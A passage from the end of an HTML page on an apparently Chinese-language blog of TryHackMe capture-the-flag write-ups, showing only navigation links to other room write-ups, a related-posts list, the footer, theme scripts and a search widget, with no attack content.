href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/TryHackMe_Creative.html" title="TryHackMe_Creative"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">TryHackMe_Creative</div></div></a></div><div class="next-post pull-right"><a href="/post/TryHackMe_Library.html" title="TryHackMe_Library"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">TryHackMe_Library</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/TryHackMe-CyberHeroes.html" title="TryHackMe_CyberHeroes"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_CyberHeroes</div></div></a></div><div><a href="/post/TruHackMe_Valley.html" title="TryHackMe_Valley"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_Valley</div></div></a></div><div><a href="/post/TryHackMe_Anthem.html" title="TryHackMe_Anthem"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_Anthem</div></div></a></div><div><a href="/post/TryHackMe_Archangel.html" title="TryHackMe_tomghost"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-15</div><div class="title">TryHackMe_tomghost</div></div></a></div><div><a href="/post/TryHackMe_Blueprint.html" title="TryHackMe_Buleprint"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-12</div><div class="title">TryHackMe_Buleprint</div></div></a></div><div><a href="/post/TryHackMe_Brute_It.html" title="TryHackMe_Brute It"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-17</div><div class="title">TryHackMe_Brute It</div></div></a></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2026 By X9wd09ncc</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
